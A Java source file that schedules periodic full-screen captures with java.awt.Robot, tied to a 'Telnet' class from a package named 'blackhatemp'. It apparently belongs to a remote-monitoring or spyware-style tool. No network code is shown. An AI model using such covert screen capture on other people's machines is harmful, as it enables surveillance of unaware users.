/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package threading;

import blackhatemp.Telnet;
import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;

/**
 *
 * @author abaza
 */
public class ScreenShot_Impilmantation {

    private Screen SSC;
    private Telnet Main_Class;
//    private Connection Con = null;

    public void Status(Boolean SwitchKey, int Delay,Telnet Class) {
        this.Main_Class = Class;
        if (!SwitchKey) {
            Delay = 0;
        }
        screenchopt(SwitchKey, Delay);
    }

    private void screenchopt(boolean run, int sco) {
        try {
            Robot robot = null;
            Rectangle rectangle = null;
            Dimension dim = Toolkit.getDefaultToolkit().getScreenSize();
            GraphicsEnvironment gEnv = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice gDev = gEnv.getDefaultScreenDevice();
            rectangle = new Rectangle(dim);
            robot = new Robot(gDev);
            if ((sco == 0) && (run == false)) {
                if (SSC != null) {
                    SSC.end();
                    SSC = null;
                    System.gc();
                    return;
                }
            }
            long Sleep = sco * 1000;
            SSC = new Screen(Sleep, robot, rectangle,this.Main_Class);
        } catch (AWTException ex) {
            System.err.println(ex);
        }
    }

}
